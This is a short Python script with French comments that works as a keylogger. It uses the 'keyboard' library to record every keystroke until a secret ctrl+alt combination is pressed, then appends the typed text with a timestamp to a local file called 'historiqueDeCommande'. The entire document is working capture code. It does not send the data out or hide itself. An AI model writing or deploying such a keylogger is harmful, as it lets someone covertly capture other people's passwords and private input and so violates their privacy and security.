import keyboard # for keylogs
from datetime import datetime

secrete_command ="ctrl+alt"
fileobject=open("historiqueDeCommande","a",encoding = 'utf-8') #ouverture/creation fichier
fileobject.write(str(datetime.now())+" :") #ecrit la date actuelle
fileobject.write('\n')
recorded_events = keyboard.record(secrete_command ) #recupere toutes les entrees jusqu'a rentrer la commande secrete
fileobject.write(''.join(list(keyboard.get_typed_strings(recorded_events)))) #ecrit toutes les commandes dans le fichier 
fileobject.write('\n')
fileobject.close() #fermeture du fichier